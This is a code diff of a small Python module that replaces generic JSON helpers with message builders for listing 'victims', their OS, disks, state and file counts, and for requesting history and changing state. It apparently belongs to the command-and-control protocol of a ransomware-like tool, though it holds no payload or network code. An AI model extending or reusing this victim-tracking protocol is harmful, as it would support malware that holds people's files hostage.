@@ -15,47 +15,67 @@ import json
 # --------------------------------------------
 
 
-def response(key1=None, val1=None, key2=None, val2=None, key3=None, val3=None, key4=None, val4=None, key5=None, val5=None,key6=None,val6=None):
-    title = {
-        key1: val1,
-        key2: val2,
-        key3: val3,
-        key4: val4,
-        key5: val5,
-        key6: val6
+def list_victim_req():
+    list_victim_req = {
+        'LIST_REQ': None
     }
+    ljson = json.dumps(list_victim_req)
 
-    title_json = json.dumps(title)
+    return ljson
 
-    return title_json
-
-
-def req(key1, val1):
-    title = {
-        key1: val1,
+def list_victim_resp(id, hash, os, disks, state, nb_files):
+    list_victim_resp = {
+        'VICTIM': id,
+        'HASH': hash,
+        'OS': os,
+        'DISKS': disks,
+        'STATE': state,
+        'NB_FILES': nb_files
     }
+    ljson = json.dumps(list_victim_resp)
 
-    title_json = json.dumps(title)
+    return ljson
 
-    return title_json
-
-
-def end(key1, val1):
-    title = {
-        key1: val1
+def list_victim_end():
+    list_victim_end = {
+        'LIST_END': None
     }
+    ljson = json.dumps(list_victim_end)
 
-    title_json = json.dumps(title)
+    return ljson
 
-    return title_json
-
-
-def state(key1, val1, key2, val2):
-    title = {
-        key1: val1,
-        key2: val2
+def history_req(id):
+    history_req = {
+        'HIST_REQ': id
     }
+    hqjson = json.dumps(history_req)
 
-    title_json = json.dumps(title)
+    return hqjson
 
-    return title_json
+def history_resp(id, timestamp, state, nb_files):
+    history_resp = {
+        'HIST_RESP': id,
+        'TIMESTAMP': timestamp,
+        'STATE': state,
+        'NB_FILES': nb_files
+    }
+    hrjson = json.dumps(history_resp)
+
+    return hrjson
+
+def history_end(id):
+    history_end = {
+        'HIST_END': id
+    }
+    hejson = json.dumps(history_end)
+
+    return hejson
+
+def change_state(id, state):
+    change_state = {
+        'CHGSTATE': id,
+        'STATE': state
+    }
+    csjson = json.dumps(change_state)
+
+    return csjson
